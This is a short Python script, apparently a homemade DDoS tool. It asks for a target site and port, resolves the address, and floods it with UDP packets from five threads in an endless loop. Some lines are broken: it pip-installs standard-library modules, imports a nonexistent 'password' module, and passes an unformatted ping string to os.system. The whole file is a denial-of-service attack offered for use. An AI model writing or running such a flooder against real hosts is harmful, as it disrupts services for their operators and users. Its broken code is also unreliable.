import os
import sys
os.system('pip install time')
os.system('pip install socket')
os.system('pip install _thread')
import time
import requests
import socket
import _thread
print(f'\033[31m')
from time import sleep
import password
sleep(0.02)
x = ("""
	 

		""")
for CoursNight in x :
	sleep(0.002)
	print(CoursNight,end='' ,flush=True)
x = '\033[31m'
print(x,'DDOS = MiLaD-TeRoRr',x)
print(f'\033[39m')
site = input("Enter your site url =≻ ")
thread_count = 5
ip = socket.gethostbyname(site)
UDP_PORT = int(input('Enter yor port (80) =≻ '))
print(f'\033[33m')
ping = os.system("ping {site}")
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
print(' ')
print(f'\033[34m')
hostname = socket.gethostname()
ip_local = socket.gethostbyname(hostname)
http = requests.get('https://api.ipify.org/').text
print(f"Hostname: {hostname}")
print(f"Your Local IP: {ip_local}")
print(f"Your Public IP: {http}")
print(f'\033[32m')
a = input('          ≺≺≺Enter≻≻≻')
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(f'\033[32m')
        print('DDOS GHOGHNOS :',ip,':','ping :',ping,'port :',UDP_PORT)
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass